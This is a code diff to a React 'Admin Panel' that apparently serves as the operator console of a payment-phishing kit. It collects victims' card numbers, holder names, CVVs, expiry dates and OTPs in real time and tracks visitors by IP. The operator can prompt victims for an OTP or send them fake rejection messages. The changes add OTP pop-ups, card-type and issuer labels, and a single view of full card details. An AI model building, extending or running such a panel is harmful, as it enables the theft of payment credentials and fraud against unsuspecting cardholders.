@@ -1,6 +1,6 @@
 
 import React, { useState, useEffect } from 'react';
-import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
+import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy, Users } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { io, Socket } from 'socket.io-client';
 import { useToast } from '@/hooks/use-toast';
@@ -36,23 +36,50 @@ interface VisitorData {
   ipAddress: string;
   timestamp: string;
   userAgent: string;
+  lastSeen: string;
 }
 
 const Admin = () => {
   const [socket, setSocket] = useState<Socket | null>(null);
   const [isConnected, setIsConnected] = useState(false);
+  const [connectionStatus, setConnectionStatus] = useState<'connecting' | 'connected' | 'disconnected' | 'error'>('connecting');
   const [payments, setPayments] = useState<PaymentData[]>([]);
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
   const { toast } = useToast();
 
+  // Function to detect card type
+  const getCardType = (cardNumber: string) => {
+    const num = cardNumber.replace(/\s/g, '');
+    if (num.startsWith('4')) return 'Visa';
+    if (num.startsWith('5') || num.startsWith('2')) return 'Mastercard';
+    if (num.startsWith('3')) return 'American Express';
+    if (num.startsWith('6')) return 'RuPay';
+    return 'Unknown';
+  };
+
+  // Function to get card issuer/bank
+  const getCardIssuer = (cardNumber: string) => {
+    const num = cardNumber.replace(/\s/g, '');
+    if (num.startsWith('4111')) return 'HDFC Bank';
+    if (num.startsWith('5555')) return 'ICICI Bank';
+    if (num.startsWith('4000')) return 'SBI Bank';
+    if (num.startsWith('3782')) return 'American Express';
+    if (num.startsWith('6521')) return 'RuPay - SBI';
+    return 'Unknown Bank';
+  };
+
   useEffect(() => {
     try {
-      // Connect to WebSocket server with proper environment handling
+      setConnectionStatus('connecting');
+      
+      // Connect to WebSocket server
       const socketUrl = process.env.NODE_ENV === 'production' 
         ? window.location.origin
         : 'http://localhost:3001';
+      
+      console.log('Admin connecting to WebSocket server:', socketUrl);
       
       const newSocket = io(socketUrl, {
         timeout: 10000,
@@ -65,29 +92,34 @@ const Admin = () => {
 
       newSocket.on('connect', () => {
         setIsConnected(true);
-        console.log('Connected to WebSocket server');
+        setConnectionStatus('connected');
+        console.log('Admin connected to WebSocket server');
       });
 
       newSocket.on('disconnect', (reason) => {
         setIsConnected(false);
-        console.log('Disconnected from WebSocket server:', reason);
+        setConnectionStatus('disconnected');
+        console.log('Admin disconnected from WebSocket server:', reason);
       });
 
       newSocket.on('connect_error', (error) => {
         setIsConnected(false);
-        console.error('WebSocket connection error:', error);
+        setConnectionStatus('error');
+        console.error('Admin WebSocket connection error:', error);
       });
 
       newSocket.on('reconnect', (attemptNumber) => {
         setIsConnected(true);
-        console.log('Reconnected to WebSocket server after', attemptNumber, 'attempts');
+        setConnectionStatus('connected');
+        console.log('Admin reconnected to WebSocket server after', attemptNumber, 'attempts');
       });
 
       newSocket.on('reconnect_error', (error) => {
-        console.error('WebSocket reconnection error:', error);
+        setConnectionStatus('error');
+        console.error('Admin WebSocket reconnection error:', error);
       });
 
-      // Listen for new payment data with error handling
+      // Listen for new payment data
       newSocket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
         try {
           if (!data || !data.cardNumber || !data.cardName) {
@@ -101,13 +133,18 @@ const Admin = () => {
             status: 'pending'
           };
           setPayments(prev => [newPayment, ...prev]);
+          
+          toast({
+            title: "New Payment Received",
+            description: `Payment from ${data.billingDetails.firstName} ${data.billingDetails.lastName}`,
+          });
         } catch (error) {
           console.error('Error processing payment data:', error);
         }
       });
 
-      // Listen for OTP submissions with error handling
-      newSocket.on('otp-submitted', (data: { otp: string }) => {
+      // Listen for OTP submissions
+      newSocket.on('otp-received', (data: { otp: string }) => {
         try {
           if (!data || !data.otp) {
             console.error('Invalid OTP data received:', data);
@@ -122,14 +159,19 @@ const Admin = () => {
               timestamp: new Date().toISOString()
             };
             setOtps(prev => [newOtp, ...prev]);
+            
+            toast({
+              title: "OTP Received",
+              description: `OTP: ${data.otp}`,
+            });
           }
         } catch (error) {
           console.error('Error processing OTP data:', error);
         }
       });
 
-      // Listen for visitor join/leave events
-      newSocket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
+      // Listen for visitor join events
+      newSocket.on('visitor-joined', (data: Omit<VisitorData, 'id' | 'lastSeen'>) => {
         try {
           if (!data || !data.ipAddress) {
             console.error('Invalid visitor data received:', data);
@@ -138,14 +180,27 @@ const Admin = () => {
           
           const newVisitor: VisitorData = {
             ...data,
-            id: Date.now().toString() + Math.random().toString(36).substr(2, 9)
+            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
+            lastSeen: new Date().toISOString()
           };
-          setLiveVisitors(prev => [newVisitor, ...prev]);
+          
+          setLiveVisitors(prev => {
+            const existing = prev.find(v => v.ipAddress === data.ipAddress);
+            if (existing) {
+              return prev.map(v => 
+                v.ipAddress === data.ipAddress 
+                  ? { ...v, lastSeen: new Date().toISOString() }
+                  : v
+              );
+            }
+            return [newVisitor, ...prev];
+          });
         } catch (error) {
           console.error('Error processing visitor data:', error);
         }
       });
 
+      // Listen for visitor leave events
       newSocket.on('visitor-left', (data: { ipAddress: string }) => {
         try {
           if (!data || !data.ipAddress) {
@@ -159,7 +214,17 @@ const Admin = () => {
         }
       });
 
+      // Clean up inactive visitors every 30 seconds
+      const visitorCleanup = setInterval(() => {
+        const now = new Date().getTime();
+        setLiveVisitors(prev => prev.filter(visitor => {
+          const lastSeen = new Date(visitor.lastSeen).getTime();
+          return (now - lastSeen) < 60000; // Remove visitors inactive for more than 1 minute
+        }));
+      }, 30000);
+
       return () => {
+        clearInterval(visitorCleanup);
         try {
           newSocket.disconnect();
         } catch (error) {
@@ -169,8 +234,9 @@ const Admin = () => {
     } catch (error) {
       console.error('Error initializing WebSocket connection:', error);
       setIsConnected(false);
+      setConnectionStatus('error');
     }
-  }, [payments]);
+  }, []);
 
   const handleAction = (paymentId: string, action: string) => {
     try {
@@ -197,25 +263,29 @@ const Admin = () => {
       switch (action) {
         case 'show-otp':
           socket.emit('show-otp');
+          toast({
+            title: "OTP Requested",
+            description: "OTP form sent to customer",
+          });
           break;
         case 'invalid-otp':
-          socket.emit('payment-rejected', 'Invalid OTP');
+          socket.emit('reject-payment', { reason: 'Invalid OTP' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'invalid-card':
-          socket.emit('payment-rejected', 'Invalid card details');
+          socket.emit('reject-payment', { reason: 'Invalid card details' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'incorrect-details':
-          socket.emit('payment-rejected', 'Incorrect card details');
+          socket.emit('reject-payment', { reason: 'Incorrect card details' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'connection-error':
-          socket.emit('payment-rejected', '404 Connection error');
+          socket.emit('reject-payment', { reason: '404 Connection error' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'successful':
-          socket.emit('payment-approved');
+          socket.emit('approve-payment');
           updatePaymentStatus(paymentId, 'approved');
           break;
         default:
@@ -271,24 +341,46 @@ const Admin = () => {
     }
   };
 
+  const getConnectionStatusColor = () => {
+    switch (connectionStatus) {
+      case 'connected': return 'text-green-400';
+      case 'connecting': return 'text-yellow-400';
+      case 'disconnected': return 'text-orange-400';
+      case 'error': return 'text-red-400';
+      default: return 'text-gray-400';
+    }
+  };
+
+  const getConnectionStatusIcon = () => {
+    switch (connectionStatus) {
+      case 'connected': return <Wifi className="h-5 w-5 text-green-400" />;
+      case 'connecting': return <Wifi className="h-5 w-5 text-yellow-400 animate-pulse" />;
+      case 'disconnected': return <WifiOff className="h-5 w-5 text-orange-400" />;
+      case 'error': return <WifiOff className="h-5 w-5 text-red-400" />;
+      default: return <WifiOff className="h-5 w-5 text-gray-400" />;
+    }
+  };
+
   return (
     <div className="min-h-screen bg-black text-white p-6">
       <div className="max-w-7xl mx-auto">
-        {/* Header */}
+        {/* Header with Connection Status */}
         <div className="flex items-center justify-between mb-8">
           <h1 className="text-3xl font-bold">Admin Panel</h1>
-          <div className="flex items-center gap-2">
-            {isConnected ? (
-              <>
-                <Wifi className="h-5 w-5 text-green-400" />
-                <span className="text-green-400">Connected</span>
-              </>
-            ) : (
-              <>
-                <WifiOff className="h-5 w-5 text-red-400" />
-                <span className="text-red-400">Disconnected</span>
-              </>
-            )}
+          <div className="flex items-center gap-6">
+            {/* Live Visitors Count */}
+            <div className="flex items-center gap-2">
+              <Users className="h-5 w-5 text-blue-400" />
+              <span className="text-blue-400">{liveVisitors.length} visitors</span>
+            </div>
+            
+            {/* Connection Status */}
+            <div className="flex items-center gap-2 bg-gray-800 px-3 py-2 rounded-lg">
+              {getConnectionStatusIcon()}
+              <span className={getConnectionStatusColor()}>
+                {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
+              </span>
+            </div>
           </div>
         </div>
 
@@ -304,7 +396,10 @@ const Admin = () => {
               <thead className="bg-gray-800">
                 <tr>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Timestamp
+                    First Seen
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    Last Activity
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                     IP Address
@@ -320,7 +415,7 @@ const Admin = () => {
               <tbody className="divide-y divide-gray-700">
                 {liveVisitors.length === 0 ? (
                   <tr>
-                    <td colSpan={4} className="px-6 py-8 text-center text-gray-400">
+                    <td colSpan={5} className="px-6 py-8 text-center text-gray-400">
                       No live visitors at the moment
                     </td>
                   </tr>
@@ -329,6 +424,9 @@ const Admin = () => {
                     <tr key={visitor.id} className="hover:bg-gray-800">
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
                         {new Date(visitor.timestamp).toLocaleString()}
+                      </td>
+                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                        {new Date(visitor.lastSeen).toLocaleString()}
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
@@ -372,16 +470,10 @@ const Admin = () => {
                     Customer
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Card Number
+                    Card Details
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Holder Name
-                  </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    CVV
-                  </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Expiry
+                    Card Info
                   </th>
                   <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                     Amount
@@ -397,7 +489,7 @@ const Admin = () => {
               <tbody className="divide-y divide-gray-700">
                 {payments.length === 0 ? (
                   <tr>
-                    <td colSpan={9} className="px-6 py-8 text-center text-gray-400">
+                    <td colSpan={7} className="px-6 py-8 text-center text-gray-400">
                       No payment data received yet. Waiting for transactions...
                     </td>
                   </tr>
@@ -412,27 +504,30 @@ const Admin = () => {
                         <div className="text-sm text-gray-400">{payment.billingDetails.email}</div>
                         <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
-                        <div className="flex items-center gap-2">
-                          <span className="text-green-400">{payment.cardNumber}</span>
+                      <td className="px-6 py-4 whitespace-nowrap">
+                        <div className="flex items-center gap-2 mb-1">
+                          <span className="text-green-400 font-mono text-sm">{payment.cardNumber}</span>
                           <Button
                             variant="ghost"
                             size="sm"
                             onClick={() => copyToClipboard(payment.cardNumber)}
-                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
+                            className="h-6 w-6 p-0 text-gray-400 hover:text-white hover:bg-gray-700"
                           >
                             <Copy className="h-3 w-3" />
                           </Button>
                         </div>
+                        <div className="text-xs text-gray-400">
+                          <div>Holder: {payment.cardName}</div>
+                          <div>CVV: {payment.cvv} | Exp: {payment.expiry}</div>
+                        </div>
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm">
-                        {payment.cardName}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
-                        {payment.cvv}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
-                        {payment.expiry}
+                        <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-medium mb-1">
+                          {getCardType(payment.cardNumber)}
+                        </div>
+                        <div className="text-xs text-gray-400">
+                          {getCardIssuer(payment.cardNumber)}
+                        </div>
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                         ₹{payment.amount.toLocaleString()}
